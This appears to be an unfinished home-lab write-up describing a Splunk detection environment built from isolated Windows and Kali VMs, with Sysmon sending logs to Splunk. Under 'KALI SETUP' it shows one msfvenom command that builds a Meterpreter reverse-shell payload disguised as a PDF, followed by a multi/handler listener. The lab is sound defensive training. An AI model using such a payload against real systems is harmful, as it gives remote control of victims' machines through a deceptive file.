Objective

This Splunk Lab project was created to establish a controlled environment for simulating and detecting cyber attacks. The primary focus was to ingest and analyze logs within a SIEM, generating test telemetry to mimic real-world attack scenarios.  
Skills Learned

[Bullet Points - Remove this afterwards]
Log Analysis
Advanced understanding of SIEM concepts and practical application.
Proficiency in analyzing and interpreting network logs.
Ability to generate and recognize attack signatures and patterns.
Enhanced knowledge of network protocols and security vulnerabilities.
Development of critical thinking and problem-solving skills in cybersecurity.
Tools Used
[Bullet Points - Remove this afterwards]

Security Information and Event Management (SIEM) system for log ingestion and analysis.
Network analysis tools (such as Wireshark) for capturing and examining network traffic.
Telemetry generation tools to create realistic network traffic and attack scenarios.
Steps
drag & drop screenshots here or use imgur and reference them using imgsrc

Every screenshot should have some text explaining what the screenshot is about.

Example below.

Spin up TWO VM's, One being Windows and the other being Kali Linux, with the network adapter set to the Internal Network setting while making both VM IP's static to the same network, I selected this network scheme for security purposes because I do not want these VM's routing to the internet while still being able to communicate with the other. 
The IP's in this lab are: Windows box - 192.168.33.2, Kali box - 192.168.33.3 
<img width="583" alt="image" src="https://github.com/user-attachments/assets/5b423ff8-596e-4f76-95a8-854c507c9b36" />
Ref 1: Virtual Box Settings

To set up our blue team environment, we will be configuring Sysmon on the endpoint to gather logs and send them directly to our Splunk instance.
We did this by allocating a Sysmon config file from Github, copying it to our directory, and running the command ./sysmon64.exe -i sysmonconfig.xml
Installing Sysmon will enhance our ability to capture system events (Since I don't want to expose these VMs to the internet, I downloaded the config file from my main PC, enabled bidirectional drag and drop on the VM, and copied the file into the box. 

SPLUNK SETUP


KALI SETUP

Created Malware payload msfvenmo -p windows/x64/meterpreter_reverse_tcp lhost-192.168.33.3 -f exe quarterlyreport.pdf.exe

ran multi/handler on msf exploit 
